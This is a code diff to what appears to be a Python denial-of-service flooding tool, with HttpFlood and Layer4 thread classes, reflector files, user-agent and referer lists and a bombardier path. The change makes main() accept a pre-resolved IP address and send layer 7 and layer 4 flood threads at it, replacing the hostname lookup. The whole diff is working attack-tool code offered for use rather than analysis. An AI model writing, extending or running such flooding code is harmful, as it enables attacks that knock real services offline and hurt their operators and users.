@@ -982,7 +982,7 @@ class HttpFlood(Thread):
         if name == "KILLER": self.SENT_FLOOD = self.KILLER
 
 
-def main(method, urlraw, threads, timer, proxy_fn=None, rpc=None, debug=False, refl_li_fn=None):
+def main(method, urlraw, ip, threads, timer, proxy_fn=None, rpc=None, debug=False, refl_li_fn=None):
     port = None
     url = None
     event = Event()
@@ -1002,12 +1002,6 @@ def main(method, urlraw, threads, timer, proxy_fn=None, rpc=None, debug=False, r
 
     if method in Methods.LAYER7_METHODS:
         url = URL(urlraw)
-        host = url.host
-        try:
-            host = gethostbyname(url.host)
-        except Exception as e:
-            exit('Cannot resolve hostname ', url.host, e)
-
         useragent_li = Path(__dir__ / "files/useragent.txt")
         referers_li = Path(__dir__ / "files/referers.txt")
         bombardier_path = Path.home() / "go/bin/bombardier"
@@ -1035,7 +1029,7 @@ def main(method, urlraw, threads, timer, proxy_fn=None, rpc=None, debug=False, r
         if not referers: exit("Empty Referer File ")
 
         for thread_id in range(threads):
-            HttpFlood(thread_id, url, host, method, rpc, event,
+            HttpFlood(thread_id, url, ip, method, rpc, event,
                       uagents, referers, proxies).start()
 
     if method in Methods.LAYER4_METHODS:
@@ -1043,11 +1037,6 @@ def main(method, urlraw, threads, timer, proxy_fn=None, rpc=None, debug=False, r
 
         port = target.port
         target = target.host
-
-        try:
-            target = gethostbyname(target)
-        except Exception as e:
-            exit('Cannot resolve hostname ', target, e)
 
         if port > 65535 or port < 1:
             exit("Invalid Port [Min: 1 / Max: 65535] ")
@@ -1067,7 +1056,7 @@ def main(method, urlraw, threads, timer, proxy_fn=None, rpc=None, debug=False, r
             if not ref: exit("Empty Reflector File ")
 
         for _ in range(threads):
-            Layer4((target, port), ref, method, event,
+            Layer4((ip, port), ref, method, event,
                    proxies).start()
 
     logger.info(
